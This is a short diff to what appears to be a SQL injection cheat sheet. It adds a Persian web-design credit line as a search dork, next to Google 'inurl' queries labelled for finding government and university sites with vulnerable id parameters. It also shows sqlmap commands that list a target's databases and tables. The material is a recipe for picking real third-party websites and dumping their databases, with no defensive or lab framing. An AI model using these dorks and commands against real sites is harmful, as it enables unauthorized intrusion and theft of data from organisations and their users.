@@ -32,6 +32,8 @@ inurl:"branches.php?id="        Find Goverment Site
 inurl:"detalle.php?id=" 	      Find University
 inurl:"detail-service.php?id="
 
+"طراحی شده توسط شرکت چنار خیام"
+
 sqlmap -u URL --dbs
 
 sqlmap -u URL -D @@ --tables
